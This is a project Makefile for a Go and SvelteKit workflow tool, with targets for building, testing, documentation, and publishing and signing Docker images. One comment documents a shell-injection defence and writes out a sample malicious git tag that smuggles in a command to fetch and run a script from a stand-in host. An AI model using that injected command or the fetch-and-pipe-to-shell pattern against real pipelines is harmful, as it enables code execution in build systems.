APP_NAME    := kilasflow
GO          := go
WEB_DIR     := web
SDK_DIR     := sdk
DOCS_DIR    := docs
DIST_DIR    := internal/web/dist
BIN_DIR     := bin
VERSION     ?= $(shell git describe --tags --always --dirty 2>/dev/null || echo "0.1.0-dev")
# Read from the environment for the reason IMAGE_ARGS is: a git ref name may
# contain a double quote, so `-ldflags="… -X main.version=$(VERSION)"` lets a
# crafted tag close the quoting and run a command during an ordinary build.
LDFLAGS     := -s -w -X main.version=$$KILASFLOW_VERSION
GO_BIN      := $(shell $(GO) env GOBIN 2>/dev/null)

# Published image coordinates. IMAGE is the product name rather than the
# repository name (k-flow) because it is what a consumer types in a `docker pull`;
# it stays overridable so a fork can publish into its own namespace without
# editing this file.
IMAGE          ?= ghcr.io/kilaslab/kilasflow
PLATFORMS      ?= linux/amd64,linux/arm64
REVISION       ?= $(shell git rev-parse HEAD 2>/dev/null || echo unknown)
SOURCE_URL     ?= https://github.com/kilaslab/kilas-flow

# Where `docker buildx --push` writes the digest of what it published. Under .tmp
# because `make clean` already removes it and .gitignore already covers it.
IMAGE_METADATA ?= .tmp/image-metadata.json

# One list shared by every image target. A locally built image and a published one
# come from the same Dockerfile and the same arguments, which is what makes
# reproducing a published image from a commit possible at all.
#
# The values are read from the environment rather than interpolated, and that is
# a security property rather than a style. VERSION reaches these recipes from
# `git describe --tags` or from a workflow's github.ref_name, and a git tag may
# legally contain a single quote — so `-t '$(VERSION)'` would let a tag named
#   v1.0.0'; curl evil.example/x | sh; '
# close the quote and run a command inside the release pipeline. Make puts a
# target-specific export straight into the child's environment without a shell
# ever parsing it, so the value below is data no matter what it contains.
IMAGE_ARGS  := --build-arg VERSION="$$KILASFLOW_VERSION" \
               --build-arg REVISION="$$KILASFLOW_REVISION" \
               --build-arg SOURCE="$$KILASFLOW_SOURCE"

# Every recipe that names an image or a version gets them this way.
IMAGE_TARGETS := build docker docker-multiarch docker-release docker-sign smoke-docker-published
$(IMAGE_TARGETS): export KILASFLOW_IMAGE = $(IMAGE)
$(IMAGE_TARGETS): export KILASFLOW_VERSION = $(VERSION)
$(IMAGE_TARGETS): export KILASFLOW_REVISION = $(REVISION)
$(IMAGE_TARGETS): export KILASFLOW_SOURCE = $(SOURCE_URL)
$(IMAGE_TARGETS): export KILASFLOW_APP_NAME = $(APP_NAME)

ifeq ($(strip $(GO_BIN)),)
GO_BIN      := $(shell $(GO) env GOPATH 2>/dev/null)/bin
endif

# `go install` writes Air to GOBIN (or GOPATH/bin), which need not be on a
# developer's shell PATH. Keep the override for a system-managed Air binary.
AIR         ?= $(GO_BIN)/air

.DEFAULT_GOAL := help

.PHONY: help
help: ## Show this help
	@echo "KilasFlow development commands"
	@echo ""
	@grep -hE '^[a-zA-Z_-]+:.*?## ' $(MAKEFILE_LIST) \
		| awk 'BEGIN {FS = ":.*?## "}; {printf "  \033[36m%-14s\033[0m %s\n", $$1, $$2}'
	@echo ""
	@echo "Dev servers:  Go on :8080, Vite on :5173 (open :5173)"

.PHONY: setup
setup: ## Install all dependencies
	$(GO) mod download
	$(GO) install github.com/air-verse/air@v1.67.4
	cd $(WEB_DIR) && pnpm install

# Override when a port is taken by another project:
#   make dev KILASFLOW_WEB_PORT=5180
KILASFLOW_WEB_PORT ?= 5173
export KILASFLOW_WEB_PORT

.PHONY: dev
dev: ## Run backend and frontend with hot reload
	@echo "Go   -> http://127.0.0.1:8080"
	@echo "Vite -> http://127.0.0.1:$(KILASFLOW_WEB_PORT)   <- open this one"
	@trap 'kill 0' INT TERM EXIT; \
		$(MAKE) dev-api & api_pid=$$!; \
		$(MAKE) dev-web & web_pid=$$!; \
		while kill -0 "$$api_pid" 2>/dev/null && kill -0 "$$web_pid" 2>/dev/null; do sleep 1; done; \
		exit 1

.PHONY: dev-api
dev-api: ## Run the Go backend with Air
	$(AIR)

.PHONY: dev-web
dev-web: ## Run the SvelteKit dev server
	cd $(WEB_DIR) && pnpm dev

# The build owns DIST_DIR outright: everything under it is ignored by git, and
# the only committed file there is the .gitkeep recreated below. Nothing this
# target writes is tracked, which is what keeps `git describe --dirty` honest
# and the tree clean after a build.
.PHONY: build-web
build-web: ## Build the SPA into the Go embed directory
	cd $(WEB_DIR) && pnpm build
	rm -rf $(DIST_DIR)
	mkdir -p $(DIST_DIR)
	cp -R $(WEB_DIR)/build/. $(DIST_DIR)/
	@touch $(DIST_DIR)/.gitkeep

.PHONY: build
build: ## Build the production binary (run build-web first for the real SPA)
	CGO_ENABLED=0 $(GO) build \
		-trimpath \
		-ldflags="$(LDFLAGS)" \
		-o $(BIN_DIR)/$(APP_NAME) \
		./cmd/$(APP_NAME)
	@echo "built $(BIN_DIR)/$(APP_NAME) ($$KILASFLOW_VERSION)"

.PHONY: build-all
build-all: build-web build ## Full production build: SPA embedded in the binary

# A build must leave tracked files alone. The regression this guards is real and
# silent: a committed dist/index.html placeholder was overwritten by build-web,
# which made the tree dirty before `git describe --dirty` ran and stamped every
# binary, image and health response "-dirty" on a clean checkout. Untracked
# output (everything else under DIST_DIR) is ignored on purpose — that is what
# the frontend build is allowed to write.
#
# Runs build-all first, so it needs a tree that is already clean: commit before
# running it by hand. In CI that is the checkout.
.PHONY: build-clean-check
build-clean-check: build-all ## Fail if a build modifies a tracked file
	@test -z "$$(git status --porcelain --untracked-files=no)" || { \
		echo "build-clean-check: the build modified tracked files:" >&2; \
		git status --porcelain --untracked-files=no >&2; \
		exit 1; \
	}
	@echo "build-clean-check: no tracked file changed"

.PHONY: run
run: build ## Build and run the binary
	./$(BIN_DIR)/$(APP_NAME)

# The PostgreSQL-gated packages run against the one database named by
# KILASFLOW_TEST_POSTGRES_DSN, and internal/database's migration tests drop
# every KilasFlow table on entry. `go test ./...` runs packages in parallel by
# default, so one package's reset deletes another's schema mid-test — the
# failures read as "relation executions does not exist" in whichever test lost
# the race. A DSN therefore turns package parallelism off (see
# .pine/memory/persistence.md); with no DSN every one of those tests skips and
# the default is kept.
.PHONY: test
test: ## Run Go tests
	$(GO) test ./... -race $(if $(KILASFLOW_TEST_POSTGRES_DSN),-p 1)

.PHONY: web-test
web-test: ## Run the frontend test suite
	cd $(WEB_DIR) && pnpm test

.PHONY: sdk-check
sdk-check: ## Typecheck the host SDK
	cd $(SDK_DIR) && pnpm check

.PHONY: sdk-test
sdk-test: ## Run the host SDK test suite
	cd $(SDK_DIR) && pnpm test

# The SDK ships compiled `dist/`, so a type error that only `tsc -p
# tsconfig.build.json` reaches would otherwise surface at publish time.
.PHONY: sdk-build
sdk-build: ## Build the host SDK into sdk/dist
	cd $(SDK_DIR) && pnpm build

# `SDK_VERSION` in sdk/src/version.ts mirrors `version` in sdk/package.json by
# contract (see docs/src/content/docs/reference/api-contract.md), and the
# manifest licence must stay Apache-2.0 to match the repository root LICENSE.
# Both are one-line node assertions rather than a script file because there is
# nothing to reuse: two reads, two comparisons, and a non-zero exit naming
# the fix. The SDK_VERSION match is extracted with a plain regex on purpose —
# importing the module would execute it, and this check must stay a read.
.PHONY: sdk-version-check
sdk-version-check: ## Fail if the SDK manifest disagrees with its version source
	node -e 'const fs=require("node:fs");const m=JSON.parse(fs.readFileSync("sdk/package.json","utf8"));const src=fs.readFileSync("sdk/src/version.ts","utf8");const v=(src.match(/export const SDK_VERSION\s*=\s*["\x27]([^"\x27]+)/)||[])[1];let ok=true;if(m.version!==v){console.error("sdk/package.json version ("+m.version+") != SDK_VERSION ("+v+"); bump both together");ok=false}if(m.license!=="Apache-2.0"){console.error("sdk/package.json license ("+m.license+") must be Apache-2.0 to match the repository LICENSE");ok=false}process.exit(ok?0:1)'

# The documentation site. Like the SDK targets above, these assume `pnpm install`
# has already been run in the directory — `make setup` deliberately installs only
# web/, because that is the one a contributor needs to run the product, and
# making every Go change wait on three dependency trees would be a poor trade.
#
# docs/ is a third pnpm project and not part of the binary: nothing here is
# copied into $(DIST_DIR) or reached by a go:embed directive, which is the whole
# reason the site is a sibling of web/ rather than a route inside it.
.PHONY: docs
docs: ## Run the documentation site dev server
	cd $(DOCS_DIR) && pnpm dev

# Link validation runs on build only — `astro dev` does not do it — so this is
# the target CI calls. A broken internal link fails it exactly like a syntax
# error would, which is the point: a page renamed by a later change cannot
# quietly orphan a link to it.
#
# DOCS_SITE and DOCS_BASE are read by astro.config.mjs and left empty here. A
# local build then serves from the root, and the deployment sets them from the
# repository it is actually publishing to, so the subpath is never guessed.
.PHONY: docs-build
docs-build: ## Build the documentation site, validating internal links
	cd $(DOCS_DIR) && pnpm build

# orval loads web/tsconfig.json, which extends the generated
# .svelte-kit/tsconfig.json. That file is gitignored, so on a fresh clone — and
# on every CI runner — the API generators die with "File
# './.svelte-kit/tsconfig.json' not found" before they ever reach the spec.
# `pnpm check` happens to sync as a side effect, which is why this only bites
# when the generators run on their own.
.PHONY: web-sync
web-sync:
	cd $(WEB_DIR) && pnpm exec svelte-kit sync

# Both generators boot a real binary via scripts/openapi-spec.mjs and read its
# OpenAPI document. The binary they build embeds whatever is in DIST_DIR, which
# a fresh clone leaves holding only its .gitkeep — the placeholder page the
# binary then serves comes from internal/web/placeholder, not from there.
#
# Make cannot express the `generate:api` spelling the package scripts use — a
# colon is Make's rule separator — so the targets are hyphenated.
.PHONY: generate-api
generate-api: web-sync ## Regenerate the web API client from a freshly built binary
	cd $(WEB_DIR) && pnpm generate:api

.PHONY: generate-api-check
generate-api-check: web-sync ## Fail if the committed web API client is stale
	cd $(WEB_DIR) && pnpm generate:api:check

.PHONY: generate-types
generate-types: ## Regenerate the SDK types from a freshly built binary
	cd $(SDK_DIR) && pnpm generate:types

.PHONY: generate-types-check
generate-types-check: ## Fail if the committed SDK types are stale
	cd $(SDK_DIR) && pnpm generate:types:check

# The public API reference is generated from the OpenAPI document of a real
# binary, not written by hand. Like the two targets above this one boots a
# server via scripts/openapi-spec.mjs. The committed pages live under docs/ but
# the script itself needs only node and go, so there is no pnpm step here.
.PHONY: generate-api-reference
generate-api-reference: ## Regenerate the docs API reference from a freshly built binary
	node scripts/generate-api-reference.mjs

.PHONY: generate-api-reference-check
generate-api-reference-check: ## Fail if the committed docs API reference is stale
	node scripts/generate-api-reference.mjs --check

# The configuration reference and the example YAML are generated from the
# Config structs, not written by hand. Unlike the targets above this one needs
# no binary: it reads source and defaults only, so a struct change with no
# regenerated reference fails the check below.
.PHONY: generate-config-reference
generate-config-reference: ## Regenerate the configuration reference and config.example.yaml
	$(GO) run ./scripts/config-reference.go

.PHONY: generate-config-reference-check
generate-config-reference-check: ## Fail if the generated configuration files are stale
	$(GO) run ./scripts/config-reference.go --check

.PHONY: test-cover
test-cover: ## Run Go tests with a coverage report
	$(GO) test ./... -coverprofile=coverage.out
	$(GO) tool cover -func=coverage.out | tail -1

.PHONY: lint
lint: ## Vet Go code and typecheck the frontend
	$(GO) vet ./...
	@test -z "$$(gofmt -l . | grep -v '^$(WEB_DIR)/')" || \
		{ echo "gofmt needed:"; gofmt -l . | grep -v '^$(WEB_DIR)/'; exit 1; }
	cd $(WEB_DIR) && pnpm check
	cd $(WEB_DIR) && pnpm test

.PHONY: tidy
tidy: ## Tidy go.mod
	$(GO) mod tidy

.PHONY: docker
docker: ## Build the Docker image for this machine's architecture
	docker build $(IMAGE_ARGS) \
		-t "$$KILASFLOW_APP_NAME:$$KILASFLOW_VERSION" \
		-t "$$KILASFLOW_APP_NAME:latest" .

# Cross-builds both published architectures and throws the result away. This is
# what a pull request runs: without it the arm64 path is first exercised while
# cutting a release, which is the worst possible moment to discover it broken.
# cacheonly rather than --load because a manifest list cannot be loaded into a
# local daemon, and rather than --push because a pull request must not publish.
.PHONY: docker-multiarch
docker-multiarch: ## Cross-build the image for every published architecture, publishing nothing
	docker buildx build --platform $(PLATFORMS) $(IMAGE_ARGS) --output type=cacheonly .

# The one command that publishes. VERSION must be a release tag: scripts/docker-tags.sh
# rejects anything else, so a `git describe` hash can never reach the registry as
# `latest`. SBOM and provenance are attached at the start because attestations are
# awkward to add once consumers have started trusting unattested images.
.PHONY: docker-release
docker-release: ## Build and push the multi-architecture image (VERSION must be a vX.Y.Z tag)
	@mkdir -p $(dir $(IMAGE_METADATA))
	docker buildx build \
		--platform $(PLATFORMS) \
		$(IMAGE_ARGS) \
		$$(sh scripts/docker-tags.sh) \
		--sbom=true \
		--provenance=mode=max \
		--metadata-file $(IMAGE_METADATA) \
		--push \
		.

# Separate from docker-release because signing needs an OIDC token that only a
# CI run has — folding it into the build would make the release target impossible
# to run by hand. Signs the digest rather than a tag: a tag can move between the
# push and the signature, and then the signature covers something else.
.PHONY: docker-sign
docker-sign: ## Sign the image docker-release just pushed (needs cosign and an OIDC token)
	@test -f $(IMAGE_METADATA) || { \
		echo "$(IMAGE_METADATA) is missing; run make docker-release first" >&2; exit 1; }
	@digest=$$(sed -n 's/.*"containerimage.digest"[^"]*"\([^"]*\)".*/\1/p' $(IMAGE_METADATA)); \
	case "$$digest" in \
		sha256:*) ;; \
		*) echo "no image digest in $(IMAGE_METADATA); run make docker-release first" >&2; exit 1 ;; \
	esac; \
	cosign sign --yes "$$KILASFLOW_IMAGE@$$digest"

.PHONY: corpus
corpus: ## Fetch the n8n importer regression corpus (needs KILASFLOW_N8N_REFERENCE)
	scripts/corpus-sync.sh

.PHONY: node-packs
node-packs: ## Regenerate the committed node packs from their vendored specs
	@for version in 202409 202502; do \
	  $(GO) run ./cmd/nodepackgen \
	    -spec third_party/waha/openapi-$$version.json \
	    -manifest packs/waha/manifest-$$version.json \
	    -out packs/waha/pack-$$version.json \
	    -trigger-out packs/waha/pack-trigger-$$version.json \
	    -report packs/waha/REPORT-$$version.md || exit 1; \
	done

.PHONY: corpus-baseline
corpus-baseline: ## Rescore the corpus and rewrite BASELINE.md and baseline.json
	$(GO) test ./internal/interop/n8n/corpus -update-baseline -count=1 -v

# TestCorpusScoreboard skips when .corpus/ has not been materialised, and a skip
# reads as a pass in a summarised test run. `-v` is the whole point of this
# target: it prints either the comparison against baseline.json or the skip
# line naming the sync command, so the state of the corpus is never inferred.
.PHONY: corpus-check
corpus-check: ## Verify BASELINE.md, or say the corpus is not materialised
	$(GO) test ./internal/interop/n8n/corpus -count=1 -v

.PHONY: smoke-sqlite
smoke-sqlite: ## Prove the embedded binary against a fresh SQLite database
	sh scripts/smoke-sqlite.sh

# The repository is github.com/kilaslab/kilas-flow, and every coordinate a
# consumer reads — Go module path, image, source URL, OCI label, docs, SDK
# metadata — has to say so. The old organisation name appeared throughout and
# belongs to nobody, which is a squatting target rather than a typo — so this
# guard greps for it, and this comment deliberately does not spell it out (the
# guard cannot except its own prose without weakening itself). See
# scripts/check-coordinates.sh for what is checked and what is excepted
# (`.pine/`, whose tickets record the rename and quote the old path on purpose).
.PHONY: coordinates-check
coordinates-check: ## Fail if a published coordinate names the wrong GitHub owner
	sh scripts/check-coordinates.sh

.PHONY: smoke-dev
smoke-dev: ## Prove the Vite development proxy against a temporary Go server
	sh scripts/smoke-dev.sh

.PHONY: smoke-docker
smoke-docker: ## Prove the non-root Docker image against a persisted SQLite bind mount
	sh scripts/smoke-docker.sh

# The same assertions against what was actually published. A locally built image
# cannot prove the part that only exists in a registry: that pulling one tag on
# this machine resolves through the manifest list to an image this architecture
# can run. Run on a release runner after the push, and by hand on an arm64 laptop
# to prove the other half of the list.
.PHONY: smoke-docker-published
smoke-docker-published: ## Prove the published image by pulling it (VERSION must be a published tag)
	KILASFLOW_SMOKE_IMAGE="$$KILASFLOW_IMAGE:$$KILASFLOW_VERSION" \
		KILASFLOW_SMOKE_PULL=1 sh scripts/smoke-docker.sh

.PHONY: smoke-postgres
smoke-postgres: ## Prove the Docker image against the temporary Compose PostgreSQL service
	sh scripts/smoke-postgres.sh

# The Playwright suite builds the binary and the SPA itself (global-setup runs
# `make build-all`), so this target only needs the e2e dependencies installed
# — plus web's, for the SPA build. CI installs both before calling it.
.PHONY: test-e2e
test-e2e: ## Run the Playwright end-to-end suite against a real binary and SPA
	cd e2e && pnpm test

# Run after test-e2e (and after a failure, hence the CI `if: always()`): the
# JSON report it reads exists either way. A skipped test is not a passing test,
# and this is the step that says so — see e2e/skip-budget.json.
.PHONY: e2e-skip-budget
e2e-skip-budget: ## Fail if the e2e suite skipped more than its recorded budget
	node e2e/scripts/skip-budget.mjs

# On-demand only: single-machine timings with third-party-adjacent variance
# make it a bad merge gate and a good investigation tool. FEAT-8mymac.
# Without N8N_EMAIL/N8N_PASSWORD the n8n half records an honest skip and the
# KilasFlow half still runs (preliminary, never a comparison).
.PHONY: bench-compare
bench-compare: build ## Run the KilasFlow-vs-n8n runtime benchmark (30 runs/workflow)
	node e2e/benchmark/run.mjs

.PHONY: clean
clean: ## Remove build artifacts
	rm -rf $(BIN_DIR) .tmp coverage.out
	rm -rf $(WEB_DIR)/build $(WEB_DIR)/.svelte-kit
	rm -rf $(DOCS_DIR)/dist $(DOCS_DIR)/.astro
	# The embed directive needs at least one file under DIST_DIR, so the
	# directory is recreated around its tracked .gitkeep rather than removed.
	rm -rf $(DIST_DIR)
	@mkdir -p $(DIST_DIR) && touch $(DIST_DIR)/.gitkeep
